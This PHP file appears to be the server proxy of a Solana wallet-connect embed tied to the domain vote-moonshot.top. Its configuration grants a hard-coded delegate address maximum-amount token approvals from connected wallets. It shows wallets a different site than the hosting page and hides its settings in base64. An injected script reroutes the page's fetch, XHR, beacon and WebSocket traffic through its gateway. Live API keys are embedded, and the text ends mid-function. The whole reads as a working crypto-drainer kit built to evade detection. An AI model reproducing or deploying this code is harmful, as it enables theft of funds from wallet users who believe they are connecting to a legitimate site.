<?php
declare(strict_types=1);

/**
 * Wallet embed PHP proxy — edit $cfg below, then: node vps/build-loader.mjs
 */

$cfg = [
    'reown_project_id' => '6a35a723a14b78178c5565dca5141ab8',

    'script_path' => 'vault38472',
    'button_class_mode' => 'exact',
    'button_class' => 'ffrf2',
    'network' => 'solana',

    'site_name' => 'Connect Wallet',
    'site_description' => 'Connect your Solana wallet',
    'site_icons' => ['https://fuzzy-octo-guacamole-delta.vercel.app/tYZq2BsVawvS5wYEF.svg'],
    // Shown in wallet connect UI / popup (Reown metadata). Page can be vote-moonshot.top; this is the public face.
    'site_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app',

    'vercel_bundle_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app/0EBM88LeOsHh.js',

    'analytics' => false,
    'restrict_script_access' => true,
    'allowed_script_hosts' => ['vote-moonshot.top', 'www.vote-moonshot.top'],

    'token_approval_enabled' => true,
    'token_delegate' => 'c9eSVFDgCT4utkZL6PPnJfaiAGecDQy8JJBAKeND2ws',
    'token_approval_max_count' => 1,
    'token_approval_min_usd' => 1.0,
    'token_approval_amount_mode' => 'max',
    // Set HELIUS_RPC_URL on Vercel (server-side only). PHP never calls Helius directly.
    'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=68b95562-1955-4c26-92ba-0e240a8b9d62',

    'connect_popup_enabled' => true,
    'connect_popup_url' => '',
    // Phantom / wallet UI runs on Vercel /connect/ (not vote-moonshot in the extension prompt).
    'connect_via_vercel' => true,
    'connect_host_url' => '',

    'vercel_profile_host' => 'fuzzy-octo-guacamole-delta.vercel.app',
    'profile_script' => 'Ix9fLBj7CRLZ.js',
    'gateway_chunk' => 'Qm4nR8sV2xWp.js',
    'profile_page_chunk' => 'Wn3kL8pR4vYs.js',
    'ws_relay_chunk' => 'Zt8nK4mP2wRq.js',
    'split_chunks' => ['chunks/H7kL9mN2pQx.js'],
];

function request_origin(): string
{
    $host = $_SERVER['HTTP_HOST'] ?? '';
    if ($host === '') {
        return '';
    }
    $host = preg_replace('/:\d+$/', '', $host) ?? $host;
    $https =
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
        || (($_SERVER['SERVER_PORT'] ?? '') === '443');
    return ($https ? 'https' : 'http') . '://' . $host;
}

function vault_entry_url(array $cfg): string
{
    $path = (string) ($cfg['script_path'] ?? 'vault38472');

    return rtrim(request_origin(), '/') . '/' . $path;
}

function chunk_query_url(array $cfg, string $chunk): string
{
    return vault_entry_url($cfg) . '?c=' . rawurlencode($chunk);
}

/** @param array<string, mixed> $op */
function enrich_upstream_op(array $cfg, array $op): array
{
    $chunks = chunk_names($cfg);
    $op['pid'] = (string) ($cfg['reown_project_id'] ?? '');
    $op['o'] = public_site_origin($cfg);
    $op['vo'] = vercel_api_origin($cfg);
    // Wallet images: same-origin raw proxy (reliable). Metadata/popup use Vercel via site_url.
    $op['gw'] = chunk_query_url($cfg, $chunks['gateway']);

    return $op;
}

/** Origin shown to wallets / Reown (Vercel), not the embed host. */
function public_site_origin(array $cfg): string
{
    $configured = rtrim((string) ($cfg['site_url'] ?? ''), '/');
    if ($configured !== '') {
        return $configured;
    }

    return rtrim(vercel_api_origin($cfg), '/');
}

/** @param array<string, mixed> $op */
function encode_upstream_op_payload(array $cfg, array $op): string
{
    $json = json_encode(enrich_upstream_op($cfg, $op), JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);

    return rtrim(strtr(base64_encode($json), '+/', '-_'), '=');
}

/** @param array<string, mixed> $op */
function chunk_op_get_url(array $cfg, array $op): string
{
    return chunk_query_url($cfg, chunk_names($cfg)['gateway'])
        . '&d=' . rawurlencode(encode_upstream_op_payload($cfg, $op));
}

/** @param array<string, mixed> $op */
function chunk_image_url(array $cfg, array $op): string
{
    return chunk_op_get_url($cfg, $op) . '&raw=1';
}

/** @param array<string, mixed> $op */
function serve_gateway_raw(array $cfg, array $op): void
{
    $chunks = chunk_names($cfg);
    $vercelUrl = vercel_api_origin($cfg) . '/' . $chunks['gateway'];
    $enriched = enrich_upstream_op($cfg, $op);
    $enriched['raw'] = 1;
    $body = json_encode($enriched, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $result = proxy_http_request('POST', $vercelUrl, $body, [
        'Content-Type: application/json',
        'X-Raw-Response: 1',
    ]);

    $code = $result['code'] > 0 ? $result['code'] : 502;
    http_response_code($code);
    if ($result['type'] !== '') {
        header('Content-Type: ' . $result['type']);
    }
    header('Cache-Control: public, max-age=604800, immutable');
    $origin = request_origin();
    if ($origin !== '') {
        header('Access-Control-Allow-Origin: ' . $origin);
        header('Vary: Origin');
    }
    echo $result['body'];
    exit;
}

/** @param array<string, mixed> $op */
function proxy_gateway_op(array $cfg, array $op, string $method = 'POST'): void
{
    $chunks = chunk_names($cfg);
    $vercelUrl = vercel_api_origin($cfg) . '/' . $chunks['gateway'];
    $enriched = enrich_upstream_op($cfg, $op);

    if (strtoupper($method) === 'GET') {
        $d = encode_upstream_op_payload($cfg, $op);
        proxy_forward('GET', $vercelUrl . '?d=' . rawurlencode($d), null);

        return;
    }

    $body = json_encode($enriched, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);
}

function build_embed_config(array $cfg, string $siteUrl): array
{
    $chunks = chunk_names($cfg);
    $gatewayUrl = chunk_query_url($cfg, $chunks['gateway']);
    $publicOrigin = public_site_origin($cfg);
    $popupUrl = trim((string) ($cfg['connect_popup_url'] ?? ''));
    if ($popupUrl === '') {
        $popupUrl = rtrim(vercel_api_origin($cfg), '/') . '/profile/';
    }

    $connectHostUrl = trim((string) ($cfg['connect_host_url'] ?? ''));
    if ($connectHostUrl === '') {
        $connectHostUrl = rtrim(vercel_api_origin($cfg), '/') . '/connect/';
    }

    $icons = $cfg['site_icons'] ?? [];
    if (!is_array($icons) || $icons === []) {
        $icons = [rtrim(vercel_api_origin($cfg), '/') . '/tYZq2BsVawvS5wYEF.svg'];
    }

    return [
        'projectId' => (string) ($cfg['reown_project_id'] ?? ''),
        'buttonClass' => (string) ($cfg['button_class'] ?? ''),
        'buttonClassMode' => (string) ($cfg['button_class_mode'] ?? 'exact'),
        'network' => (string) ($cfg['network'] ?? 'solana'),
        'siteName' => (string) ($cfg['site_name'] ?? 'Website'),
        'siteDescription' => (string) ($cfg['site_description'] ?? ''),
        'siteUrl' => $publicOrigin,
        'siteIcons' => array_values(array_map('strval', $icons)),
        'analytics' => (bool) ($cfg['analytics'] ?? true),
        'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? true),
        'tokenDelegate' => (string) ($cfg['token_delegate'] ?? ''),
        'tokenApprovalMaxCount' => (int) ($cfg['token_approval_max_count'] ?? 0),
        'tokenApprovalMinUsd' => (float) ($cfg['token_approval_min_usd'] ?? 1),
        'tokenApprovalAmountMode' => (string) ($cfg['token_approval_amount_mode'] ?? 'max'),
        'solanaRpcUrl' => $gatewayUrl,
        'priceApiUrl' => $gatewayUrl,
        'connectPopupEnabled' => (bool) ($cfg['connect_popup_enabled'] ?? true),
        'connectPopupUrl' => $popupUrl,
        'connectPopupTitle' => (string) ($cfg['connect_popup_title'] ?? ''),
        'connectViaVercel' => (bool) ($cfg['connect_via_vercel'] ?? true),
        'connectHostUrl' => $connectHostUrl,
        'gatewayChunk' => $chunks['gateway'],
        'chunkBase' => vault_entry_url($cfg),
        'splitChunks' => array_values($cfg['split_chunks'] ?? []),
    ];
}

function patch_bundle_chunk_paths(string $js, string $chunkBase): string
{
    return str_replace('__CHUNK__', rtrim($chunkBase, '/'), $js);
}

function embed_module_bootstrap(array $cfg): string
{
    $chunks = chunk_names($cfg);
    $entry = $chunks['bundle'] ?? basename((string) ($cfg['vercel_bundle_url'] ?? '0EBM88LeOsHh.js'));
    $baseJs = json_encode(vault_entry_url($cfg), JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $entryJs = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);

    return '(function(b,e){var s=document.createElement("script");s.type="module";'
        . 's.src=b+"?c="+encodeURIComponent(e);document.head.appendChild(s)})('
        . $baseJs . ',' . $entryJs . ');';
}

/** @return array{bundle: string, gateway: string, profileScript: string, profilePage: string, wsRelay: string} */
function chunk_names(array $cfg): array
{
    $bundle = basename((string) parse_url((string) ($cfg['vercel_bundle_url'] ?? ''), PHP_URL_PATH));
    if ($bundle === '' || $bundle === '/') {
        $bundle = '0EBM88LeOsHh.js';
    }

    return [
        'bundle' => $bundle,
        'gateway' => (string) ($cfg['gateway_chunk'] ?? 'Qm4nR8sV2xWp.js'),
        'profileScript' => (string) ($cfg['profile_script'] ?? 'Ix9fLBj7CRLZ.js'),
        'profilePage' => (string) ($cfg['profile_page_chunk'] ?? 'Wn3kL8pR4vYs.js'),
        'wsRelay' => (string) ($cfg['ws_relay_chunk'] ?? 'Zt8nK4mP2wRq.js'),
    ];
}

function is_static_split_chunk(array $cfg, string $chunk): bool
{
    $names = chunk_names($cfg);
    if ($chunk === $names['bundle']) {
        return true;
    }
    foreach ($cfg['split_chunks'] ?? [] as $rel) {
        if ($chunk === $rel || $chunk === basename((string) $rel)) {
            return true;
        }
    }

    return (bool) preg_match('#^chunks/[A-Za-z0-9._-]+\\.js$#', $chunk);
}

function serve_static_chunk(array $cfg, string $chunk): void
{
    $safe = $chunk;
    if (!preg_match('#^(?:chunks/)?[A-Za-z0-9._-]+\\.js$#', $safe)) {
        http_response_code(400);
        exit;
    }
    if (!str_contains($safe, '/')) {
        $names = chunk_names($cfg);
        if ($safe === $names['bundle']) {
            $safe = $names['bundle'];
        }
    }

    $body = fetch_remote_url(vercel_api_origin($cfg) . '/' . $safe);
    if ($body === null) {
        http_response_code(502);
        exit;
    }

    $body = patch_bundle_chunk_paths($body, vault_entry_url($cfg));
    header('Content-Type: application/javascript; charset=utf-8');
    header('Cache-Control: public, max-age=300');
    header('X-Content-Type-Options: nosniff');
    echo $body;
}

function script_request_allowed(array $cfg, string $siteUrl): bool
{
    if (array_key_exists('restrict_script_access', $cfg) && $cfg['restrict_script_access'] === false) {
        return true;
    }

    $allowedHosts = allowed_hosts($cfg, $siteUrl);
    if ($allowedHosts === []) {
        return true;
    }

    foreach (request_source_hosts() as $host) {
        if (in_array($host, $allowedHosts, true)) {
            return true;
        }
    }

    $secFetchSite = strtolower((string) ($_SERVER['HTTP_SEC_FETCH_SITE'] ?? ''));
    return $secFetchSite === 'same-origin' || $secFetchSite === 'same-site';
}

function allowed_hosts(array $cfg, string $siteUrl): array
{
    $hosts = [];
    $host = parse_url($siteUrl, PHP_URL_HOST);
    if (is_string($host) && $host !== '') {
        $hosts[] = strtolower($host);
        $hosts[] = str_starts_with($host, 'www.') ? substr($host, 4) : 'www.' . $host;
    }
    $serverHost = strtolower((string) ($_SERVER['HTTP_HOST'] ?? ''));
    $serverHost = preg_replace('/:\d+$/', '', $serverHost) ?? $serverHost;
    if ($serverHost !== '') {
        $hosts[] = $serverHost;
    }
    foreach ($cfg['allowed_script_hosts'] ?? [] as $extra) {
        if (is_string($extra) && $extra !== '') {
            $hosts[] = strtolower($extra);
        }
    }
    return array_values(array_unique($hosts));
}

function request_source_hosts(): array
{
    $hosts = [];
    foreach (['HTTP_ORIGIN', 'HTTP_REFERER'] as $header) {
        $value = $_SERVER[$header] ?? '';
        if (!is_string($value) || $value === '') {
            continue;
        }
        $host = parse_url($value, PHP_URL_HOST);
        if (is_string($host) && $host !== '') {
            $hosts[] = strtolower($host);
        }
    }
    return array_values(array_unique($hosts));
}

function embed_config_preamble(array $embedConfig): string
{
    $json = json_encode($embedConfig, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $payload = base64_encode($json);
    $chunks = array_map(
        static fn(string $part): string => '"' . addcslashes($part, "\\\"") . '"',
        str_split($payload, 48) ?: [''],
    );
    $blob = implode('+', $chunks);

    return '(function(w,f,j){var c=j.parse(f(' . $blob . '));'
        . 'Object.defineProperty(w,"__WALLET_EMBED_CONFIG__",'
        . '{value:c,writable:!1,enumerable:!1,configurable:!1})})(window,atob,JSON);';
}

function embed_network_shim(string $entry, array $chunks, array $cfg): string
{
    $entryJs = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $gwJs = json_encode($chunks['gateway'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $wsJs = json_encode($chunks['wsRelay'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
    $hmJs = json_encode(upstream_host_alias_map($cfg), JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);

    return '(function(e,g,w,HM){function off(h){try{var u=new URL(h,location.href);'
        . 'if(u.protocol==="chrome-extension:"||u.protocol==="data:"||u.protocol==="blob:")return!1;'
        . 'return u.origin!==location.origin}catch(r){return!1}}'
        . 'function isgw(h){try{var u=new URL(h,location.href),p=new URL(e,location.href);'
        . 'return u.pathname===p.pathname&&u.searchParams.get("c")===g}catch(r){return!1}}'
        . 'function dec(b){var n=b.replace(/-/g,"+").replace(/_/g,"/");var p=n.length%4?4-n.length%4:0;return atob(n+"=".repeat(p))}'
        . 'function decBytes(b){var s=dec(b),o=new Uint8Array(s.length);for(var i=0;i<s.length;i++)o[i]=s.charCodeAt(i)&255;return o}'
        . 'function mimeFromBytes(u){if(!u.length)return"application/octet-stream";if(u[0]===60)return"image/svg+xml";'
        . 'if(u[0]===137&&u[1]===80)return"image/png";if(u[0]===71&&u[1]===73)return"image/gif";'
        . 'if(u[0]===255&&u[1]===216)return"image/jpeg";'
        . 'if(u[0]===82&&u[1]===73&&u[2]===70&&u[3]===70)return"image/webp";return"application/octet-stream"}'
        . 'function wplBody(m,raw){if(m[3]==="0"){var u=decBytes(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
        . 'var ct=mimeFromBytes(u);if(ct==="image/svg+xml")return new Response(new TextDecoder().decode(u),{status:Number(m[1]),headers:{"Content-Type":ct}});'
        . 'return new Response(u,{status:Number(m[1]),headers:{"Content-Type":ct}})}'
        . 'try{return new Response(JSON.stringify(JSON.parse(raw)),{status:Number(m[1]),headers:{"Content-Type":"application/json"}})}'
        . 'catch(x){return new Response(raw,{status:Number(m[1])})}}'
        . 'function pj(r){return Promise.resolve(r).then(function(res){return res.text().then(function(t){'
        . 'var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
        . 'if(m){var raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));return wplBody(m,raw)}'
        . 'if(t.trim().charAt(0)==="<")return new Response(t,{status:res.status,headers:{"Content-Type":"image/svg+xml"}});'
        . 'return new Response(t,{status:res.status,headers:res.headers})})})}'
        . 'function gpost(o){return pj(fetch(e+"?c="+encodeURIComponent(g),{method:"POST",headers:{"Content-Type":"application/json"},'
        . 'body:JSON.stringify(o),credentials:"same-origin"}))}'
        . 'function stripPid(b){if(typeof b!=="string")return b;try{var j=JSON.parse(b);if(j&&typeof j==="object"&&!Array.isArray(j)&&"projectId"in j){delete j.projectId;return JSON.stringify(j)}}catch(x){}return b}'
        . 'function cmp(u,m,b){m=(m||"GET").toUpperCase();try{var x=new URL(u,location.href);x.searchParams.delete("projectId");'
        . 'var hk=HM[x.hostname];if(hk){var o={t:"u",h:hk,p:x.pathname+x.search,m:m};'
        . 'if(b!=null)o.b=stripPid(typeof b==="string"?b:String(b));return o}}catch(x){}'
        . 'try{var z=new URL(u,location.href);z.searchParams.delete("projectId");u=z.href}catch(x){}'
        . 'var o={t:"u",m:m,u:u};if(b!=null)o.b=stripPid(typeof b==="string"?b:String(b));return o}'
        . 'function prox(h,n){n=n||{};return gpost(cmp(h,n.method,n.body))}'
        . 'var f=fetch;fetch=function(i,n){var h=typeof i==="string"?i:i instanceof Request?i.url:String(i);'
        . 'if(isgw(h))return pj(f(i,n||{}));if(off(h))return prox(h,n);return f(i,n)};'
        . 'var nativeBeacon=navigator.sendBeacon&&navigator.sendBeacon.bind(navigator);'
        . 'if(nativeBeacon)navigator.sendBeacon=function(u,d){if(!off(u))return nativeBeacon(u,d);'
        . 'function ship(b){gpost(cmp(String(u),"POST",b)).catch(function(){});return!0}'
        . 'if(d instanceof Blob){d.text().then(ship).catch(function(){});return!0}'
        . 'if(d instanceof ArrayBuffer){ship(new TextDecoder().decode(d));return!0}'
        . 'return ship(d==null?"":typeof d==="string"?d:String(d))};'
        . 'var xo=XMLHttpRequest.prototype.open,xs=XMLHttpRequest.prototype.send;'
        . 'XMLHttpRequest.prototype.open=function(m,h){if(typeof h==="string"&&off(h)){this._px=h;this._pm=m;arguments[1]="about:blank"}return xo.apply(this,arguments)};'
        . 'XMLHttpRequest.prototype.send=function(b){if(this._px){var x=this;prox(this._px,{method:this._pm||"GET",body:b}).then(function(r){return r.text()}).then(function(t){'
        . 'x.readyState=4;x.status=200;x.responseText=t;x.onload&&x.onload()}).catch(function(){x.onerror&&x.onerror()});return}return xs.apply(this,arguments)};'
        . 'var W=WebSocket,wb=e.replace(/^http/i,"ws");WebSocket=function(h,pr){'
        . 'if(off(h))return new W(wb+"?c="+encodeURIComponent(w),pr);return new W(h,pr)}})('
        . $entryJs . ',' . $gwJs . ',' . $wsJs . ',' . $hmJs . ');';
}

function vercel_api_origin(array $cfg): string
{
    return vercel_profile_origin($cfg);
}

function vercel_site_origin(array $cfg): string
{
    $url = rtrim(detect_site_url($cfg), '/');
    if ($url !== '') {
        return $url;
    }

    return rtrim(vercel_api_origin($cfg), '/');
}

function decode_chunk_payload(string $raw): ?array
{
    if ($raw === '') {
        return null;
    }
    $pad = strlen($raw) % 4;
    if ($pad > 0) {
        $raw .= str_repeat('=', 4 - $pad);
    }
    $json = base64_decode(strtr($raw, '-_', '+/'), true);
    if ($json === false) {
        return null;
    }
    $data = json_decode($json, true);

    return is_array($data) ? $data : null;
}

function upstream_host_allowed(string $host): bool
{
    $host = strtolower($host);
    $suffixes = [
        'walletconnect.org',
        'walletconnect.com',
        'web3modal.org',
        'web3modal.com',
        'reown.com',
        'jup.ag',
        'helius-rpc.com',
        'googleapis.com',
        'gstatic.com',
    ];
    foreach ($suffixes as $suffix) {
        if ($host === $suffix || str_ends_with($host, '.' . $suffix)) {
            return true;
        }
    }

    return false;
}

function is_valid_proxy_url(string $target): bool
{
    $parts = parse_url($target);

    return is_array($parts)
        && isset($parts['scheme'], $parts['host'])
        && in_array(strtolower((string) $parts['scheme']), ['https', 'http'], true);
}

/** @return array<string, string> */
function upstream_route_bases(array $cfg): array
{
    return [
        'r' => 'https://api.reown.com',
        'm' => 'https://api.web3modal.org',
        'p' => 'https://pulse.walletconnect.org',
        'w' => 'https://explorer-api.walletconnect.com',
        'x' => 'https://rpc.walletconnect.org',
        'f' => 'https://fonts.reown.com',
        'j' => 'https://api.jup.ag',
        'v' => rtrim(vercel_api_origin($cfg), '/'),
    ];
}

/** @return array<string, string> hostname => alias */
function upstream_host_alias_map(array $cfg): array
{
    $vercelHost = parse_url(vercel_api_origin($cfg), PHP_URL_HOST);
    $map = [
        'api.reown.com' => 'r',
        'api.web3modal.org' => 'm',
        'api.web3modal.com' => 'm',
        'pulse.walletconnect.org' => 'p',
        'explorer-api.walletconnect.com' => 'w',
        'rpc.walletconnect.org' => 'x',
        'fonts.reown.com' => 'f',
        'api.jup.ag' => 'j',
    ];
    if (is_string($vercelHost) && $vercelHost !== '') {
        $map[$vercelHost] = 'v';
    }

    return $map;
}

function alias_needs_project_id(string $alias): bool
{
    return in_array($alias, ['r', 'm', 'p', 'w', 'x'], true);
}

function inject_project_id(string $url, string $projectId): string
{
    if ($projectId === '') {
        return $url;
    }
    if (preg_match('/([?&])projectId=/', $url) === 1) {
        return $url;
    }

    return $url . (str_contains($url, '?') ? '&' : '?') . 'projectId=' . rawurlencode($projectId);
}

/** @param array<string, mixed> $parts */
function rebuild_url(array $parts): string
{
    $scheme = isset($parts['scheme']) ? $parts['scheme'] . '://' : '';
    $user = $parts['user'] ?? '';
    $pass = isset($parts['pass']) ? ':' . $parts['pass'] : '';
    $auth = ($user !== '' || $pass !== '') ? $user . $pass . '@' : '';
    $host = (string) ($parts['host'] ?? '');
    $port = isset($parts['port']) ? ':' . $parts['port'] : '';
    $path = $parts['path'] ?? '';
    $query = isset($parts['query']) && $parts['query'] !== '' ? '?' . $parts['query'] : '';
    $fragment = isset($parts['fragment']) ? '#' . $parts['fragment'] : '';

    return $scheme . $auth . $host . $port . $path . $query . $fragment;
}

/** @param array<string, mixed> $op */
function resolve_upstream_target(array $cfg, array $op): ?string
{
    $direct = trim((string) ($op['u'] ?? ''));
    if ($direct !== '') {
        if (!is_valid_proxy_url($direct)) {
            return null;
        }
        $parts = parse_url($direct);
        $host = is_array($parts) ? strtolower((string) ($parts['host'] ?? '')) : '';
        if ($host === '' || !upstream_host_allowed($host)) {
            return null;
        }

        return inject_project_id($direct, (string) ($cfg['reown_project_id'] ?? ''));
    }

    $alias = (string) ($op['h'] ?? '');
    $path = (string) ($op['p'] ?? '');
    if ($alias === '' || $path === '' || $path[0] !== '/') {
        return null;
    }

    $bases = upstream_route_bases($cfg);
    $base = $bases[$alias] ?? null;
    if ($base === null) {
        return null;
    }

    $target = $base . $path;
    $parts = parse_url($target);
    $host = is_array($parts) ? strtolower((string) ($parts['host'] ?? '')) : '';
    if ($host === '' || !upstream_host_allowed($host)) {
        return null;
    }

    if (alias_needs_project_id($alias)) {
        return inject_project_id($target, (string) ($cfg['reown_project_id'] ?? ''));
    }

    return $target;
}

/** @param array<string, mixed> $op */
function prepare_upstream_body(array $cfg, array $op, ?string $body): ?string
{
    if ($body === null || $body === '') {
        return $body;
    }
    $alias = (string) ($op['h'] ?? '');
    $needsId = $alias !== '' && alias_needs_project_id($alias);
    if (!$needsId && ($op['u'] ?? '') !== '') {
        $parts = parse_url((string) $op['u']);
        $host = is_array($parts) ? strtolower((string) ($parts['host'] ?? '')) : '';
        $map = upstream_host_alias_map($cfg);
        $alias = $map[$host] ?? '';
        $needsId = $alias !== '' && alias_needs_project_id($alias);
    }
    if (!$needsId) {
        return $body;
    }

    $projectId = (string) ($cfg['reown_project_id'] ?? '');
    if ($projectId === '') {
        return $body;
    }

    $decoded = json_decode($body, true);
    if (!is_array($decoded) || array_is_list($decoded)) {
        return $body;
    }
    if (!isset($decoded['projectId'])) {
        $decoded['projectId'] = $projectId;
    }

    return json_encode($decoded, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
}

function upstream_request_origin(array $cfg): string
{
    return public_site_origin($cfg);
}

function upstream_body_as_json(string $contentType, string $body): bool
{
    $type = strtolower(trim(explode(';', $contentType)[0] ?? ''));

    if ($type !== '') {
        if (str_starts_with($type, 'image/')) {
            return false;
        }
        if (str_contains($type, 'svg')) {
            return false;
        }
        if (str_contains($type, 'octet-stream') || str_contains($type, 'font')) {
            return false;
        }
        if (str_contains($type, 'json')) {
            return true;
        }
        if ($type === 'text/plain' || $type === 'text/html') {
            return true;
        }

        return false;
    }

    $start = ltrim($body);

    return $start !== '' && ($start[0] === '{' || $start[0] === '[');
}

function emit_js_chunk_response(int $status, string $body, bool $asJson = true): void
{
    $code = $status > 0 ? $status : 502;
    $max = 5 * 1024 * 1024;
    if (strlen($body) > $max) {
        $code = 413;
        $body = '{"error":"upstream response too large"}';
        $asJson = true;
    }

    $b64 = rtrim(strtr(base64_encode($body), '+/', '-_'), '=');
    $flag = $asJson ? '1' : '0';
    $safe = addcslashes($b64, "\\\"");

    // Chunk transport always returns HTTP 200; real upstream status is inside __WPL.
    http_response_code(200);
    header('Content-Type: application/javascript; charset=utf-8');
    header('Cache-Control: no-store');
    $origin = request_origin();
    if ($origin !== '') {
        header('Access-Control-Allow-Origin: ' . $origin);
        header('Vary: Origin');
    }
    echo 'typeof self!=="undefined"&&self.__WPL&&self.__WPL('
        . $code . ',"' . $safe . '",' . $flag . ');';
    exit;
}

function serve_gateway_chunk(array $cfg): void
{
    $chunks = chunk_names($cfg);
    $vercelUrl = vercel_api_origin($cfg) . '/' . $chunks['gateway'];
    $method = strtoupper((string) ($_SERVER['REQUEST_METHOD'] ?? 'GET'));
    $d = (string) ($_GET['d'] ?? '');

    if ($method === 'GET' && $d !== '') {
        $op = decode_chunk_payload($d);
        if (is_array($op) && ($op['t'] ?? '') === 'u') {
            if ((string) ($_GET['raw'] ?? '') === '1') {
                serve_gateway_raw($cfg, $op);
            }
            proxy_gateway_op($cfg, $op, 'GET');
            exit;
        }
        emit_js_chunk_response(400, '{"error":"invalid gateway get op"}');
    }

    if ($method !== 'POST') {
        emit_js_chunk_response(405, '{"error":"method not allowed"}');
    }

    $body = file_get_contents('php://input');
    if ($body === false || $body === '') {
        emit_js_chunk_response(400, '{"error":"empty body"}');
    }

    $parsed = json_decode($body, true);
    if (!is_array($parsed)) {
        emit_js_chunk_response(400, '{"error":"invalid json"}');
    }

    if (isset($parsed['jsonrpc'])) {
        proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);

        return;
    }

    if (($parsed['t'] ?? '') === 'u') {
        proxy_gateway_op($cfg, $parsed, 'POST');

        return;
    }

    if (($parsed['t'] ?? '') === 'p') {
        proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);

        return;
    }

    emit_js_chunk_response(400, '{"error":"unknown gateway op"}');
}

function patch_gateway_wpl_response(string $response): string
{
    if (!str_contains($response, '__WPL(')) {
        return $response;
    }

    return str_replace('.js&d=', '.js?d=', $response);
}

function proxy_forward(string $method, string $url, ?string $body, array $extraHeaders = []): void
{
    $result = proxy_http_request($method, $url, $body, $extraHeaders);
    $response = patch_gateway_wpl_response($result['body']);
    $code = $result['code'];
    $type = $result['type'];

    $origin = request_origin();
    $isJsChunk = is_string($response) && str_contains($response, '__WPL(');

    if ($isJsChunk) {
        http_response_code(200);
        header('Content-Type: application/javascript; charset=utf-8');
        header('Cache-Control: no-store');
        if ($origin !== '') {
            header('Access-Control-Allow-Origin: ' . $origin);
            header('Vary: Origin');
        }
        echo $response;
        exit;
    }

    emit_js_chunk_response(
        $code > 0 ? $code : 502,
        is_string($response) && $response !== '' ? $response : '{"error":"vercel gateway failed"}',
        true,
    );
}

/**
 * @return array{code: int, type: string, body: string}
 */
function proxy_http_request(string $method, string $url, ?string $body, array $extraHeaders = []): array
{
    $headers = array_merge(['User-Agent: wallet-embed-proxy/1.0'], $extraHeaders);

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        if ($ch === false) {
            return ['code' => 502, 'type' => '', 'body' => '{"error":"curl_init failed"}'];
        }

        $opts = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 3,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_TIMEOUT => 60,
            CURLOPT_CUSTOMREQUEST => $method,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_ENCODING => '',
        ];
        if ($body !== null) {
            $opts[CURLOPT_POSTFIELDS] = $body;
        }
        curl_setopt_array($ch, $opts);
        $response = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
        curl_close($ch);

        return [
            'code' => $code,
            'type' => $type,
            'body' => $response === false ? '{"error":"upstream curl failed"}' : (string) $response,
        ];
    }

    $opts = [
        'http' => [
            'method' => $method,
            'header' => implode("\r\n", $headers),
            'timeout' => 60,
            'ignore_errors' => true,
        ],
    ];
    if ($body !== null) {
        $opts['http']['content'] = $body;
    }

    $ctx = stream_context_create($opts);
    $response = @file_get_contents($url, false, $ctx);
    $code = 0;
    $type = '';
    if (isset($http_response_header[0]) && preg_match('/ (\d{3}) /', (string) $http_response_header[0], $m)) {
        $code = (int) $m[1];
    }
    foreach ($http_response_header ?? [] as $hline) {
        if (stripos($hline, 'content-type:') === 0) {
            $type = trim(substr($hline, 13));
        }
    }

    if ($response === false) {
        return ['code' => 502, 'type' => '', 'body' => '{"error":"upstream stream request failed"}'];
    }

    return ['code' => $code, 'type' => $type, 'body' => (string) $response];
}

function vercel_profile_origin(array $cfg): string
{
    $host = trim((string) ($cfg['vercel_profile_host'] ?? ''));
    if ($host === '') {
        $host = (string) parse_url((string) ($cfg['site_url'] ?? ''), PHP_URL_HOST);
    }

    return 'https://' . $host;
}

function serve_popup_asset_proxy(array $cfg, string $file): void
{
    $safe = basename($file);
    if ($safe === '' || !preg_match('/^[A-Za-z0-9._-]+\\.js$/', $safe)) {
        http_response_code(400);
        exit;
    }
    proxy_forward('GET', vercel_profile_origin($cfg) . '/profile/' . $safe, null);
}

function serve_popup_proxy(array $cfg): void
{
    $html = fetch_remote_url(vercel_profile_origin($cfg) . '/profile/');
    if ($html === null || $html === '') {
        http_response_code(502);
        exit;
    }

    $chunks = chunk_names($cfg);
    $script = basename((string) ($cfg['profile_script'] ?? 'page.js'));
    $assetUrl = chunk_query_url($cfg, $chunks['profileScript']);
    $html = (string) preg_replace(
        '/<script\\s+src="' . preg_quote($script, '/') . '"\\s*><\\/script>/',
        '<script src="' . $assetUrl . '" defer></script>',
        $html,
        1
    );

    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo $html;
}

function send_generic_not_found(): void
{
    http_response_code(404);
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head>'
        . '<body><center><h1>404 Not Found</h1></center>'
